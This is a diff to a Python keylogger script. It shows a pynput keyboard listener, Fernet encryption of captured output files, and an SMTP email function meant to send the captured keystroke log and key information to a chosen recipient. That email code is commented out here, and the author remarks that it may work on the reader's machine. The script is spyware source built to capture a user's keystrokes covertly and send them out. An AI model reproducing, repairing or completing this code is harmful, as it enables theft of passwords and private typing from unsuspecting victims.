@@ -68,12 +68,11 @@ fernet = Fernet(key)
 count = 0
 keys = []
 
-#Email
+#Email   (It was not working on my pc but maybe it will run you yours)
 
 '''email_address = input("Enter senders Email Address: ")
 password = input("Enter App specific Password")
 toaddr = input("Enter the reciver's Address: ")
-attachment = file_merge + key_information
 
 def send_email(filename, attachment, toaddr):
 
@@ -114,13 +113,9 @@ def send_email(filename, attachment, toaddr):
 
     s.sendmail(fromaddr, toaddr, text)
 
-    s.quit()
+    s.quit()'''
 
 
-try:
-    send_email(key_information, attachment, toaddr)
-except Exception as e:
-    print("Email failed:", e)'''
 
 #PC Information
 
@@ -210,11 +205,15 @@ def on_release(released_key):
             with open(dst, "wb") as f:
                 f.write(encrypted)
 
+            '''try:
+                send_email(key_information, attachment, toaddr)
+            except Exception as e:
+                print("Email failed:", e)'''
+
         listener.stop()
         os._exit(0)
         
-#listener
-        
+#listener   
 
 with Listener(on_press=on_press, on_release=on_release) as listener: 
     listener.join()
